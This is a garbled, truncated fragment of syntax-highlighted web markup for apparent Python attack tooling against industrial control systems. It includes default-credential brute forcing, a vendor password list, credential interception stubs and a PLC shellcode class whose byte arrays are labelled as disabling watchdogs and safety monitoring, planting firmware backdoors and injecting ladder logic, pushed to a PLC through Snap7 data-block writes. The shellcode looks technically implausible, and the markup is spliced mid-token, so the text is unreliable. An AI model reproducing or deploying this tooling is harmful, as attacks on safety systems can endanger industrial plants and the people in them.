\u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003evendor\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003ecredentials\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003edefault_creds\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eitems\u003c/span\u003e():\n            \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eusername\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003epassword\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ecredentials\u003c/span\u003e:\n                \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003etest_single_credential\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eusername\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003epassword\u003c/span\u003e):\n                    \u003cspan class=\"pl-s1\"\u003evalid_defaults\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eappend\u003c/span\u003e({\n                        \u003cspan class=\"pl-s\"\u003e'vendor'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003evendor\u003c/span\u003e,\n                        \u003cspan class=\"pl-s\"\u003e'username'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eusername\u003c/span\u003e,\n                        \u003cspan class=\"pl-s\"\u003e'password'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003epassword\u003c/span\u003e\n                    })\n                    \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"[+] Default credentials valid: \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003evendor\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e - \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eusername\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e:\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003epassword\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e\"\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003evalid_defaults\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003enetwork_credential_interception\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Intercept credentials transmitted over network protocols.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Captures clear-text credentials from various industrial protocols.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eintercepted_creds\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {}\n        \n        \u003cspan class=\"pl-c\"\u003e# HTTP basic auth interception\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eintercepted_creds\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'http_basic'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eintercept_http_basic_auth\u003c/span\u003e()\n        \n        \u003cspan class=\"pl-c\"\u003e# Form-based auth interception\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eintercepted_creds\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'http_forms'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eintercept_http_form_auth\u003c/span\u003e()\n        \n        \u003cspan class=\"pl-c\"\u003e# Protocol-specific credential capture\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eintercepted_creds\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'industrial_protocols'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eintercept_industrial_protocols\u003c/span\u003e()\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eintercepted_creds\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eload_credential_database\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Load comprehensive database of common industrial system credentials.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Includes vendor defaults, common passwords, and industry-specific patterns.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ecommon_passwords\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e [\n            \u003cspan class=\"pl-c\"\u003e# Vendor defaults\u003c/span\u003e\n            \u003cspan class=\"pl-s\"\u003e'admin'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'password'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'1234'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'default'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'pass'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'siemens'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'rockwell'\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'schneider'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'abb'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'omron'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'mitsubishi'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'yokogawa'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'honeywell'\u003c/span\u003e,\n            \u003cspan class=\"pl-c\"\u003e# Common industrial passwords\u003c/span\u003e\n            \u003cspan class=\"pl-s\"\u003e'PLC'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'HMI'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'SCADA'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'OT'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'IT'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'control'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'automation'\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'factory'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'plant'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'process'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'system'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'operator'\u003c/span\u003e,\n            \u003cspan class=\"pl-c\"\u003e# Weak numeric patterns\u003c/span\u003e\n            \u003cspan class=\"pl-s\"\u003e'0000'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'1111'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'123456'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'12345678'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'123456789'\u003c/span\u003e,\n            \u003cspan class=\"pl-c\"\u003e# Season/year based\u003c/span\u003e\n class=\"pl-s\"\u003e'Fall2024'\u003c/span\u003e,\n            \u003cspan class=\"pl-c\"\u003e# Company name variations\u003c/span\u003e\n            \u003cspan data-snippet-clipboard-copy-content=\"class PLCShellcodeEngine:\n    def __init__(self, target_plc):\n        \u0026quot;\u0026quot;\u0026quot;\n        CRITICAL PLC SECURITY NOTICE: This class demonstrates PLC-specific shellcode\n        development and deployment for authorized industrial security research ONLY.\n        \n        AUTHORIZED USE CASES:\n        - PLC security research in isolated test environments\n        - Industrial control system exploit development for defensive purposes\n        - Red team exercises with proper authorization and oversight\n        - Security control validation and mitigation development\n        \n        STRICT PROHIBITIONS:\n        - NEVER use on operational production PLCs\n        - Do not deploy in critical infrastructure environments\n        - Avoid disruption of industrial processes and safety systems\n        - Comply with all industrial safety and security standards\n        \n        INDUSTRY STANDARDS COMPLIANCE:\n        - IEC 61131-3 (PLC Programming Standards)\n        - IEC 62443 (Industrial Network Security)\n        - NIST SP 800-82 (Industrial Control System Security)\n        - Vendor-specific PLC security guidelines\n        \u0026quot;\u0026quot;\u0026quot;\n        self.target = target_plc\n        self.architecture = self.detect_plc_architecture()\n        self.shellcode_registry = self.initialize_shellcode_registry()\n\n    def deploy_plc_shellcode(self, shellcode_type):\n        \u0026quot;\u0026quot;\u0026quot;\n        Deploy architecture-specific PLC shellcode based on target detection.\n        Automatically selects appropriate shellcode for detected PLC architecture.\n        \u0026quot;\u0026quot;\u0026quot;\n        deployment_results = {}\n        \n        if self.architecture == 's7-300':\n            shellcode = self.s7_300_shellcode(shellcode_type)\n            deployment_results['architecture'] = 'Siemens S7-300'\n        elif self.architecture == 's7-1500':\n            shellcode = self.s7_1500_shellcode(shellcode_type)\n            deployment_results['architecture'] = 'Siemens S7-1500'\n        elif 'rockwell' in self.architecture:\n            shellcode = self.rockwell_shellcode(shellcode_type)\n            deployment_results['architecture'] = 'Rockwell ' + self.architecture.upper()\n        else:\n            raise ValueError(f\u0026quot;Unsupported PLC architecture: {self.architecture}\u0026quot;)\n        \n        if shellcode:\n            deployment_results['shellcode_size'] = len(shellcode)\n            deployment_results['deployment_method'] = self.select_deployment_method(shellcode_type)\n            deployment_results['deployment_success'] = self.execute_deployment(shellcode, shellcode_type)\n        \n        return deployment_results\n\n    def s7_300_shellcode(self, shellcode_type):\n        \u0026quot;\u0026quot;\u0026quot;\n        Generate Siemens S7-300 specific shellcode for various exploitation scenarios.\n        Optimized for S7-300 processor architecture and memory layout.\n        \u0026quot;\u0026quot;\u0026quot;\n        shellcodes = {\n            'watchdog_bypass': bytes([\n                # Watchdog timer bypass - prevents PLC from entering stop mode\n                0x90, 0x90, 0x90, 0x90,                    # NOP sled for alignment\n                0xB8, 0x01, 0x00, 0x00, 0x00,             # mov eax, 1 (enable flag)\n                0xBB, 0x00, 0xA0, 0x00, 0x08,             # mov ebx, 0x0800A000 (watchdog control address)\n                0x89, 0x03,                               # mov [ebx], eax (write enable flag)\n                0xC3                                      # ret (return from shellcode)\n            ]),\n            'safety_override': bytes([\n                # Safety system override - disables safety monitoring functions\n                0x60,                                     # pusha (save all registers)\n                0xB9, 0xFF, 0x00, 0x00, 0x00,             # mov ecx, 255 (loop counter)\n                0xBA, 0x00, 0xB0, 0x00, 0x08,             # mov edx, 0x0800B000 (safety bits base address)\n                # loop_start:\n                0xC6, 0x02, 0x00,                         # mov byte [edx], 0 (clear safety bit)\n                0x42,                                     # inc edx (next safety bit)\n                0xE2, 0xF9,                               # loop loop_start (decrement ecx and loop if not zero)\n                0x61,                                     # popa (restore all registers)\n                0xC3                                      # ret (return from shellcode)\n            ]),\n            'persistence': bytes([\n                # PLC firmware persistence - installs backdoor in firmware\n                0xE8, 0x00, 0x00, 0x00, 0x00,             # call $+5 (get current address)\n                0x5B,                                     # pop ebx (ebx = current address)\n                0x81, 0xEB, 0x05, 0x00, 0x00, 0x00,       # sub ebx, 5 (adjust to start of shellcode)\n                0xB8, 0x05, 0x00, 0x00, 0x00,             # mov eax, 5 (open syscall number)\n                0xCD, 0x80,                               # int 0x80 (system call - open firmware file)\n                0x89, 0xC3,                               # mov ebx, eax (save file descriptor)\n                0xB8, 0x04, 0x00, 0x00, 0x00,             # mov eax, 4 (write syscall number)\n                0xB9, 0x00, 0xC0, 0x00, 0x08,             # mov ecx, 0x0800C000 (backdoor code address)\n                0xBA, 0x00, 0x01, 0x00, 0x00,             # mov edx, 256 (backdoor code size)\n                0xCD, 0x80,                               # int 0x80 (write backdoor to firmware)\n                0xC3                                      # ret (return from shellcode)\n            ]),\n            'memory_dump': bytes([\n                # Memory dumping shellcode - extracts PLC memory for analysis\n                0x60,                                     # pusha\n                0x31, 0xC0,                               # xor eax, eax\n                0xB0, 0x03,                               # mov al, 3 (sys_read)\n                0x31, 0xDB,                               # xor ebx, ebx\n                0xB3, 0x04,                               # mov bl, 4 (file descriptor)\n                0xB9, 0x00, 0x00, 0x00, 0x08,             # mov ecx, 0x08000000 (memory start)\n                0xBA, 0x00, 0x10, 0x00, 0x00,             # mov edx, 4096 (dump size)\n                0xCD, 0x80,                               # int 0x80 (read memory)\n                0x61,                                     # popa\n                0xC3                                      # ret\n            ])\n        }\n        return shellcodes.get(shellcode_type, b'')\n\n    def s7_1500_shellcode(self, shellcode_type):\n        \u0026quot;\u0026quot;\u0026quot;\n        Generate Siemens S7-1500 specific shellcode leveraging modern features.\n        Optimized for S7-1500 architecture and enhanced security mechanisms.\n        \u0026quot;\u0026quot;\u0026quot;\n        shellcodes = {\n            'watchdog_bypass': bytes([\n                # S7-1500 enhanced watchdog bypass\n                0x90, 0x90, 0x90, 0x90,                    # NOP sled\n                0xB8, 0x01, 0x00, 0x00, 0x00,             # mov eax, 1\n                0xBB, 0x00, 0xD0, 0x00, 0x08,             # mov ebx, 0x0800D000 (S7-1500 watchdog)\n                0x89, 0x03,                               # mov [ebx], eax\n                0xC3                                      # ret\n            ]),\n            'security_bypass': bytes([\n                # S7-1500 security mechanism bypass\n                0x60,                                     # pusha\n                0xB8, 0x00, 0x00, 0x00, 0x00,             # mov eax, 0 (disable security)\n                0xBB, 0x00, 0xE0, 0x00, 0x08,             # mov ebx, 0x0800E000 (security register)\n                0x89, 0x03,                               # mov [ebx], eax\n                0x61,                                     # popa\n                0xC3                                      # ret\n            ])\n        }\n        return shellcodes.get(shellcode_type, b'')\n\n    def rockwell_shellcode(self, shellcode_type):\n        \u0026quot;\u0026quot;\u0026quot;\n        Generate Rockwell Automation PLC specific shellcode.\n        Targeted at ControlLogix and CompactLogix series processors.\n        \u0026quot;\u0026quot;\u0026quot;\n        shellcodes = {\n            'watchdog_bypass': bytes([\n                # Rockwell watchdog bypass\n                0x90, 0x90, 0x90, 0x90,                    # NOP sled\n                0xB8, 0x01, 0x00, 0x00, 0x00,             # mov eax, 1\n                0xBB, 0x00, 0xF0, 0x00, 0x08,             # mov ebx, 0x0800F000 (Rockwell watchdog)\n                0x89, 0x03,                               # mov [ebx], eax\n                0xC3                                      # ret\n            ]),\n            'ladder_logic_injection': bytes([\n                # Ladder logic manipulation shellcode\n                0x60,                                     # pusha\n                0xB9, 0x64, 0x00, 0x00, 0x00,             # mov ecx, 100 (rung count)\n                0xBA, 0x00, 0x00, 0x01, 0x08,             # mov edx, 0x08010000 (ladder logic base)\n                # injection_loop:\n                0xC6, 0x02, 0xFF,                         # mov byte [edx], 0xFF (inject instruction)\n                0x42,                                     # inc edx\n                0xE2, 0xFA,                               # loop injection_loop\n                0x61,                                     # popa\n                0xC3                                      # ret\n            ])\n        }\n        return shellcodes.get(shellcode_type, b'')\n\n    def deploy_via_data_blocks(self, shellcode, db_number=99):\n        \u0026quot;\u0026quot;\u0026quot;\n        Deploy shellcode through PLC data block writes using Snap7 library.\n        Writes shellcode to specified data block and sets execution trigger.\n        \u0026quot;\u0026quot;\u0026quot;\n        try:\n            import snap7\n            print(f\u0026quot;[*] Deploying shellcode to DB{db_number} on {self.target}\u0026quot;)\n            \n            # Initialize Snap7 client\n            client = snap7.client.Client()\n            client.connect(self.target, 0, 1)  # Connect to PLC (rack 0, slot 1)\n            \n            # Write shellcode to data block\n            write_result = client.write_area(0x84, db_number, 0, shellcode)\n            print(f\u0026quot;[+] Shellcode written to DB{db_number}: {len(shellcode)} bytes\u0026quot;)\n            \n            # Create and write execution trigger\n            trigger_payload = self.create_execution_trigger()\n            trigger_offset = len(shellcode)\n            client.write_area(0x84, db_number, trigger_offset, trigger_payload)\n            print(f\u0026quot;[+] Execution trigger written at offset {trigger_offset}\u0026quot;)\n            \n            # Verify deployment\n            verification = self.verify_shellcode_deployment(client, db_number, shellcode)\n            \n            client.disconnect()\n            \n            return {\n                'deployment_success': True,\n                'data_block': db_number,\n                'shellcode_size': len(shellcode),\n                'verification_success': verification,\n                'execution_trigger_set': True\n            }\n            \n        except Exception as e:\n            print(f\u0026quot;[-] Shellcode deployment failed: {e}\u0026quot;)\n            return {\n                'deployment_success': False,\n                'error': str(e)\n            }\n\n    def deploy_via_system_functions(self, shellcode):\n        \u0026quot;\u0026quot;\u0026quot;\n        Deploy shellcode through PLC system function calls.\n        Uses legitimate system functions to execute shellcode.\n        \u0026quot;\u0026quot;\u0026quot;\n        deployment_methods = {\n            'sfc_write': self.deploy_via_sfc_write,\n            'block_transfer': self.deploy_via_block_transfer,\n            'diagnostic_buffer': self.deploy_via_diagnostic_buffer\n        }\n        \n        results = {}\n        for method_name, method_func in deployment_methods.items():\n            try:\n                results[method_name] = method_func(shellcode)\n            except Exception as e:\n                results[method_name] = {'success': False, 'error': str(e)}\n        \n        return results\n\n    def create_execution_trigger(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Create execution trigger payload to activate deployed shellcode.\n        Typically sets a specific memory value or register to trigger execution.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Execution trigger: write specific value to trigger address\n        trigger_payload = bytes([\n            0xDE, 0xAD, 0xBE, 0xEF  # Magic trigger value\n        ])\n        return trigger_payload\n\n    def detect_plc_architecture(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Detect PLC architecture through network scanning and protocol analysis.\n        Identifies vendor, series, and specific processor type.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Implementation would include:\n        # - Siemens S7Comm protocol interrogation\n        # - Rockwell CIP/EtherNetIP device identification\n        # - Banner grabbing and service enumeration\n        # - Firmware version analysis\n        \n        # Placeholder detection logic\n        architectures = ['s7-300', 's7-1500', 'rockwell-controllogix', 'rockwell-compactlogix']\n        \n        # In real implementation, this would perform actual detection\n        return 's7-300'  # Default for example purposes\n\n    def initialize_shellcode_registry(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        Initialize registry of available shellcode types and their characteristics.\n        Provides metadata for shellcode selection and deployment.\n        \u0026quot;\u0026quot;\u0026quot;\n        return {\n            'watchdog_bypass': {\n                'description': 'Disables PLC watchdog timer to prevent automatic shutdown',\n                'size_range': '16-32 bytes',\n                'risk_level': 'HIGH',\n                'detection_probability': 'MEDIUM'\n            },\n            'safety_override': {\n                'description': 'Overrides safety system monitoring functions',\n                'size_range': '24-48 bytes', \n                'risk_level': 'CRITICAL',\n                'detection_probability': 'HIGH'\n            },\n            'persistence': {\n                'description': 'Installs persistent backdoor in PLC firmware',\n                'size_range': '32-64 bytes',\n                'risk_level': 'HIGH',\n                'detection_probability': 'LOW'\n            },\n            'memory_dump': {\n                'description': 'Extracts PLC memory contents for analysis',\n                'size_range': '20-40 bytes',\n                'risk_level': 'MEDIUM',\n                'detection_probability': 'MEDIUM'\n            }\n        }\n\n    def select_deployment_method(self, shellcode_type):\n        \u0026quot;\u0026quot;\u0026quot;\n        Select optimal deployment method based on shellcode type and target.\n        Considers detection risk, reliability, and target compatibility.\n        \u0026quot;\u0026quot;\u0026quot;\n        deployment_strategies = {\n            'watchdog_bypass': 'data_blocks',\n            'safety_override': 'system_functions', \n            'persistence': 'data_blocks',\n            'memory_dump': 'system_functions'\n        }\n        \n        return deployment_strategies.get(shellcode_type, 'data_blocks')\n\n    def execute_deployment(self, shellcode, shellcode_type):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute shellcode deployment using selected method.\n        Handles the actual deployment process based on chosen strategy.\n        \u0026quot;\u0026quot;\u0026quot;\n        deployment_method = self.select_deployment_method(shellcode_type)\n        \n        if deployment_method == 'data_blocks':\n            return self.deploy_via_data_blocks(shellcode)\n        elif deployment_method == 'system_functions':\n            return self.deploy_via_system_functions(shellcode)\n        else:\n            return {'success': False, 'error': 'Unknown deployment method'}\n\n    def verify_shellcode_deployment(self, client, db_number, expected_shellcode):\n        \u0026quot;\u0026quot;\u0026quot;\n        Verify successful shellcode deployment by reading back and comparing.\n        Ensures shellcode was written correctly to target data block.\n        \u0026quot;\u0026quot;\u0026quot;\n        try:\n            # Read back deployed shellcode\n            deployed_data = client.read_area(0x84, db_number, 0, len(expected_shellcode))\n            \n            # Compare with original shellcode\n            verification_success = deployed_data == expected_shellcode\n            \n            if verification_success:\n                print(\u0026quot;[+] Shellcode deployment verified successfully\u0026quot;)\n            else:\n                print(\u0026quot;[-] Shellcode deployment verification failed\u0026quot;)\n                \n            return verification_success\n            \n        except Exception as e:\n            print(f\u0026quot;[-] from entering stop mode\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0x90\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x90\u003c/span\u003e, \u003cspan        \u003cspan class=\"pl-c1\"\u003e0xB8\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x01\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e,             \u003cspan class=\"pl-c\"\u003e# mov eax, 1 (enable flag)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xBB\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0xA0\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x08\u003c/span\u003e,             \u003cspan class=\"pl-c\"\u003e# mov ebx, 0x0800A000 (watchdog control address)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0x89\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x03\u003c/span\u003e,                               \u003cspan class=\"pl-c\"\u003e# mov [ebx], eax (write enable flag)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xC3\u003c/span\u003e                                      \u003cspan class=\"pl-c\"\u003e# ret (return from shellcode)\u003c/span\u003e\n            ]),\n            \u003cspan class=\"pl-s\"\u003e'safety_override'\u003c/span\u003e: \u003cspan class=\"pl-en\"\u003ebytes\u003c/span\u003e([\n                \u003cspan class=\"pl-c\"\u003e# Safety system override - disables safety monitoring functions\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0x60\u003c/span\u003e,                                     \u003cspan class=\"pl-c\"\u003e# pusha (save all registers)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xB9\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0xFF\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e,             \u003cspan class=\"pl-c\"\u003e# mov ecx, 255 (loop counter)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xBA\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0xB0\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x08\u003c/span\u003e,             \u003cspan class=\"pl-c\"\u003e# mov edx, 0x0800B000 (safety bits base address)\u003c/span\u003e\n                \u003cspan class=\"pl-c\"\u003e# loop_start:\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xC6\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x02\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e,                         \u003cspan class=\"pl-c\"\u003e# mov byte [edx], 0 (clear safety bit)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0x42\u003c/span\u003e,                                     \u003cspan class=\"pl-c\"\u003e# inc edx (next safety bit)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xE2\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0xF9\u003c/span\u003e,                               \u003cspan class=\"pl-c\"\u003e# loop loop_start (decrement ecx and loop if not zero)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0x61\u003c/span\u003e,                                     \u003cspan class=\"pl-c\"\u003e# popa (restore all registers)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xC3\u003c/span\u003e                                      \u003cspan class=\"pl-c\"\u003e# ret (return from shellcode)\u003c/span\u003e\n            ]),\n            \u003cspan class=\"pl-s\"\u003e'persistence'\u003c/span\u003e: \u003cspan class=\"pl-en\"\u003ebytes\u003c/span\u003e([\n                \u003cspan class=\"pl-c\"\u003e# PLC firmware persistence - installs backdoor in firmware\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xE8\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e,             \u003cspan class=\"pl-c\"\u003e# call $+5 (get current address)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0x5B\u003c/span\u003e,                                     \u003cspan class=\"pl-c\"\u003e# pop ebx (ebx = current address)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0x81\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0xEB\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x05\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e,       \u003cspan class=\"pl-c\"\u003e# sub ebx, 5 (adjust to start of shellcode)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xB8\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x05\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e,             \u003cspan class=\"pl-c\"\u003e# mov eax, 5 (open syscall number)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xCD\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x80\u003c/span\u003e,                               \u003cspan class=\"pl-c\"\u003e# int 0x80 (system call - open firmware file)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0x89\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0xC3\u003c/span\u003e,                               \u003cspan class=\"pl-c\"\u003e# mov ebx, eax (save file descriptor)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xB8\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x04\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e,             \u003cspan class=\"pl-c\"\u003e# mov eax, 4 (write syscall number)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xB9\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0xC0\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x08\u003c/span\u003e,             \u003cspan class=\"pl-c\"\u003e# mov ecx, 0x0800C000 (backdoor code address)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xBA\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x01\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x00\u003c/span\u003e,             \u003cspan class=\"pl-c\"\u003e# mov edx, 256 (backdoor code size)\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0xCD\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e0x80\u003c/span\u003e,   \u003cspan class=\"pl-c\"\u003e# ret (return from shellcode)\u003c/span\u003e\n            ]),\n            \u003cspan class=\"pl-s\"\u003e'memory_dump'\u003c/span\u003e: \u003cspan class=\"pl-en\"\u003ebytes\u003c/span\u003e([\n                \u003cspan class=\"pl-c\"\u003e# Memory dumping shellcode - extracts PLC memory for analysis\u003c/span\u003e\n                \u003cspan class=\"pl-c1\"\u003e0x60\u003c/span\u003e,                                     \u003cspan class=\"pl-c\"\u003e# pusha\u003c/span\u003e\n                \u003cspan 